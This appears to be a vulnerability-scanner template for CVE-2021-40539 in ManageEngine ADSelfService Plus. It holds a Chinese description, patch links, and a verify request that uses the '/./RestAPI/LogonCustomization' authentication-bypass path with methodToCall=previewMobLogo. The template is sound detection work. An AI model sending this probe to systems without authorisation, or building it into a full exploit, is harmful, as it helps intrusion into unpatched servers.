app: ZOHO-ManageEngine-ADSelfService
query: title:"ManageEngine - ADSelfService Plus"
meta:
  name: ADSelfService Plus RCE CVE-2021-40539
  level: 4
  tags:
    - remote_code_execution
  description: Zoho ManageEngine ADSelfService Plus 6113版本及更早版本存在授权问题漏洞，该漏洞源于软件很容易绕过REST API认证，从而导致远程代码执行
  homepage: https://www.manageengine.cn/products/self-service-password/pricing-details.html
  author: Administrator
  references: https://forum.butian.net/share/876
  solution: |-
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://www.manageengine.com/products/self-service-password/service-pack.html
    这是官方文档中给出的危险检测工具，则是通过日志报错信息、相应路径下是否含有key和证书、不常规web路径下是否含有jsp文件去检测是否被入侵
    https://www.manageengine.com/products/self-service-password/kb/how-to-fix-authentication-bypass-vulnerability-in-REST-API.html
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: POST
            path: /./RestAPI/LogonCustomization
            redirect: true
            header:
              - Content-Type: application/x-www-form-urlencoded
            params: methodToCall=previewMobLogo
          response:
            - name: code
              value: "200"
              type: equals
            - name: body
              value: var d = new Date();
              type: contains
            - name: body
              value: window.parent.$("#tabLogo")
              type: contains
  create_at: "2022-06-09 15:34:55"
